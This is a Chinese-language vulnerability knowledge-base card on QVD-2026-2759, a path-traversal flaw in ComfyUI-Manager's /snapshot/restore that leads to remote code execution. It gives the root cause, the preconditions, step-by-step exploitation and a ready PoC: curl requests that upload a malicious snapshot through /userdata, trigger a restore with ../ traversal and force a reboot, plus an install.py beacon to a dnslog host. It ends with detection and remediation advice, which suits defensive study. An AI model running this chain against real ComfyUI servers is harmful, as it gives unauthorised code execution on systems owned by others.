---
id: web-python-comfyui-manager-snapshot-restore-path-traversal-qvd-2026-2759
title: ComfyUI-Manager QVD-2026-2759：/snapshot/restore 路径穿越 + userdata 写入恶意快照，重启恢复时安装远程仓库执行 install.py
type: scenario
domain: web
path: web/python
technique: comfyui-manager-snapshot-restore-path-traversal-rce
tags:
- python
- comfyui
- comfyui-manager
- path-traversal
- snapshot
- userdata
- install-script
- rce
- qvd-2026-2759
cve: []
severity: critical
confidence: medium
status: verified
affected_versions: < 3.39.2
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V161
  verified_at: '2026-11-06T13:49:57+08:00'
  notes: 已对照原文核对：/userdata 可直接写 ComfyUI-Manager/snapshots/test.json、/snapshot/restore target=test 及 ../ 穿越、shutil.copy 到 startup-scripts/restore-snapshot.json、restore_snapshot 以 instant_execution=True 调 repo_install、install.py DNSLog 验证均与图文一致；图05 注入值为 security_level=normal 与正文 weak 有出入，卡内未据此下结论；未在本机复跑。
url: /docs/web/python/web-python-comfyui-manager-snapshot-restore-path-traversal-qvd-2026-2759/
draft: false
kb_aliases:
- QVD-2026-2759
- ComfyUI-Manager 快照恢复 RCE
- snapshot/restore 路径穿越
- restore-snapshot.json
- userdata 任意 JSON 写入
- ComfyUI-Manager install.py 执行
---

## 一句话结论

ComfyUI-Manager `< 3.39.2` 的 `/snapshot/restore` 把用户可控的 `target` 直接 `os.path.join` 到快照目录，未做 `..`/分隔符/NUL 规范化；攻击者先用 `/userdata` 写入一个含恶意 Git 仓库地址的快照 JSON，再通过 `target` 路径穿越让 restore 把它复制为 `startup-scripts/restore-snapshot.json`，重启后恢复流程以 `instant_execution=True` 安装该仓库，仓库根目录的 `install.py` 被直接执行，形成未授权 RCE。

## 原理

- **快照恢复的路径拼接**：`manager_server.py` 的 `/snapshot/restore` 读取 `request.rel_url.query["target"]`，执行
  `path = os.path.join(core.manager_snapshot_path, f"{target}.json")`，
  然后 `shutil.copy(path, os.path.join(core.manager_startup_script_path, "restore-snapshot.json"))`。代码没有对 `target` 做 `..`、`/`、`\`、NUL 的检查，也没有用 `realpath`/`commonpath` 限制在快照目录内。
- **路径穿越的可控读取**：`target` 中包含 `../`（Windows 下 `..\`）即可跳出 `manager_snapshot_path`，让 restore 读取攻击者放在其他目录的 JSON，并把内容复制到启动脚本目录的 `restore-snapshot.json`。
- **任意 JSON 落地**：`/userdata/<path>` 接口允许把文件写进 ComfyUI 用户目录。原文请求
  `POST /userdata/ComfyUI-Manager%2Fsnapshots%2Ftest.json`
  成功写入快照目录（响应返回 `"ComfyUI-Manager/snapshots/test.json"`）；因此攻击者无需先穿越就能把恶意快照放到 restore 可读位置，穿越则用于把 restore 指向快照目录之外的任意 JSON。
- **重启触发快照恢复**：写入 `startup-scripts/restore-snapshot.json` 后，重启 ComfyUI（`/api/manager/reboot` 或 `/manager/reboot`）会进入快照恢复流程。`restore_snapshot()` 遍历快照中的 `git_info.keys()`，对每个仓库执行
  `unified_manager.repo_install(repo_url, to_path, instant_execution=True, no_deps=...)`。
- **install.py 执行**：`instant_execution=True` 表示克隆完成后立即执行仓库根目录的 `install.py`，不需要等插件导入；脚本以 ComfyUI 进程权限运行，无签名/白名单校验。原文的恶意仓库 `install.py` 通过 `socket.gethostbyname('<随机子域>.log.dnslog.pp.ua')` 发起 DNS 查询验证执行成功。
- **修复**：3.39.2 在 patch 中新增 `get_safe_snapshot_path(target)`，拒绝包含 `/`、`\`、`..`、`\x00` 的 target，并对 `snapshot/remove`、`snapshot/restore` 同时加限制；`write_config` 也增加 CRLF/NUL 清洗（同一版本的另一处修复）。
- **与 CRLF 链的区别**：同一版本还有“`/manager/share_option` 等接口 CRLF 注入 `security_level` → `/api/customnode/install/git_url` 安装”的链；本条利用的是快照恢复的路径穿越与 userdata 写入，不需要先降级 security_level，也不依赖 `git_url` 接口。

## 触发条件

- ComfyUI-Manager `< 3.39.2`。
- ComfyUI 对攻击者网络可达（常见 `--listen`，默认 8188），`/userdata`、`/snapshot/restore`、`/manager/reboot` 未加额外认证或访问控制。
- `security_level` 允许 middle 级操作（默认 `normal` 即可；`/snapshot/restore` 在 `is_allowed_security_level('middle')` 内）。
- 目标可访问攻击者托管的 Git 仓库（GitHub 或内网 Git 服务）。
- 服务能重启，且启动脚本目录 `startup-scripts/` 可写；若部署方式不会自动拉起 ComfyUI，需要等待管理员重启。
- 进程对 `custom_nodes/` 有写权限，且安装流程未禁用 `install.py` 执行。

## 利用步骤

1. 准备恶意仓库，根目录放 `install.py`（验证可用 DNS 外带或写文件）：
   ```python
   import socket
   socket.gethostbyname("xxxxxx.log.dnslog.pp.ua")
   ```
2. 构造快照 JSON，把仓库 URL 放进 `custom_nodes`（或 `git_custom_nodes`），例如：
   ```json
   {
     "custom_nodes": {
       "https://github.com/<attacker>/malicious-node.git": {
         "hash": "111asdasdsad",
         "disabled": false
       }
     }
   }
   ```
3. 上传快照：
   ```bash
   curl -i -X POST "http://TARGET:8188/userdata/ComfyUI-Manager%2Fsnapshots%2Ftest.json" \
     -H "Content-Type: application/json" --data-binary @snapshot.json
   ```
4. 触发恢复：
   ```bash
   # 直接读快照目录内的 test.json
   curl -i "http://TARGET:8188/snapshot/restore?target=test"
   # 或路径穿越读取其他目录的 JSON（按目标平台选择分隔符）
   curl -i "http://TARGET:8188/snapshot/restore?target=../../default/1"
   ```
5. 重启使 `restore-snapshot.json` 生效：
   ```bash
   curl -i "http://TARGET:8188/api/manager/reboot"
   # 兼容旧路由：curl -i "http://TARGET:8188/manager/reboot"
   ```
6. 观察 DNS 日志/文件落地/子进程，确认 `install.py` 执行；恶意节点同时会被克隆到 `custom_nodes/`，后续重启也可能通过插件 `__init__.py` 再次执行。

## PoC

恶意快照 JSON（最小）：

```json
{"custom_nodes":{"https://github.com/<attacker>/malicious-node.git":{"hash":"111asdasdsad","disabled":false}}}
```

```bash
BASE="http://TARGET:8188"

curl -i -X POST "$BASE/userdata/ComfyUI-Manager%2Fsnapshots%2Ftest.json" \
  -H "Content-Type: application/json" \
  -d '{"custom_nodes":{"https://github.com/<attacker>/malicious-node.git":{"hash":"111asdasdsad","disabled":false}}}'

curl -i "$BASE/snapshot/restore?target=test"
curl -i "$BASE/api/manager/reboot"
```

恶意仓库根目录 `install.py`：

```python
import socket
socket.gethostbyname("xxxxxx.log.dnslog.pp.ua")
```

## 变体与关联

- **穿越到任意 JSON**：若 userdata 不能直接写快照目录，用 `target=../../<dir>/<file>`（Linux）或 `target=..\..\<dir>\<file>`（Windows）指向 userdata 中已上传的 JSON；不同版本的分隔符过滤强度不同。
- **snapshot/remove 穿越**：同一 patch 也修了 `/snapshot/remove`，旧版可用 `target` 穿越删除任意 `.json`，可配合拒绝服务/清理痕迹，但不是本条的主链。
- **快照字段**：除 `custom_nodes`/`git_custom_nodes` 外，`cnr_custom_nodes`、`pips` 等字段也可能在恢复流程中触发节点安装或依赖安装，执行面取决于 Manager 实现。
- **与 CRLF 链组合**：若 `/snapshot/restore` 因 security_level 被拒，可先用 `/manager/share_option` 等 CRLF 注入降级（见关联卡），再走本条；两条链最终都落到 `install.py`/插件执行。
- **关联**：[[web-python-comfyui-manager-crlf-security-level-weaken-install-py-rce]]（CRLF 注入 security_level + git_url + install.py）、[[web-python-comfyui-manager-snapshot-restore-traversal-bypass]]（v3.38 对 CVE-2025-67303 修复的反斜杠绕过，场景相近但版本/前提不同）、[[web-python-comfyui-manager-weak-config-git-clone-reboot-rce]]（CVE-2025-67303 原始配置覆盖链）、[[web-python-comfyui-manager-cve-2026-22777-configparser-crlf-git-exe-rce]]（同版本 CRLF + git_exe 劫持）。

## 检测与防御

- **路径校验**：对 `target` 做 `realpath` + `commonpath` 校验，确保解析后的路径位于快照目录内；拒绝绝对路径、`..`、`/`、`\`、NUL、URL 编码后的分隔符；不要只做字符串黑名单。
- **目录隔离**：快照目录与 userdata 上传目录彻底隔离；restore 只允许读取快照目录内的规范化文件名，写入 `startup-scripts/restore-snapshot.json` 前再次校验来源。
- **接口鉴权**：`/userdata`、`/snapshot/*`、`/manager/*` 增加认证、Origin/CSRF 校验与访问控制；不要用 `--listen` 把 ComfyUI-Manager 暴露到公网。
- **安装控制**：对快照中的 `git_custom_nodes`/`cnr_custom_nodes` 做来源白名单与签名校验；禁用或审批 `install.py` 的即时执行（`instant_execution`），安装脚本在沙箱/低权限用户下运行。
- **检测**：`POST /userdata/*.json` 后紧跟 `GET /snapshot/restore?target=...`（尤其含 `..`、`%2e%2e`、`%5c`、`%2f`），随后出现 `/manager/reboot`、对陌生 Git 仓库的 clone、`custom_nodes/` 新增目录与 `install.py`/`__init__.py`、ComfyUI 进程派生 `git`/`python install.py` 等子进程。
- **修复**：升级到 ComfyUI-Manager `>= 3.39.2`（同时包含 CRLF 清洗与快照路径校验）。
